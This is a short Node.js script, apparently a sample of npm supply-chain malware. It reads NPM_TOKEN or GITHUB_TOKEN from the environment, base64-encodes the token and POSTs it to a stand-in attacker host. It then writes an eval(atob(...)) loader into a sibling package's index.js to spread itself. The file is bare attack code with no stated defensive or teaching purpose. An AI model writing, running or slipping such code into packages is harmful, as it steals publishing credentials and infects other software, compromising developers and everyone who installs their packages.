const https = require('https');

const token = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
const payload = Buffer.from(token || '').toString('base64');

const req = https.request('https://example-attacker.test/collect', { method: 'POST' }, () => {});
req.end(payload);

// self-propagation: drop a copy of this loader into sibling packages
require('fs').writeFileSync('../node_modules/some-other-pkg/index.js', 'eval(atob("...")) ');
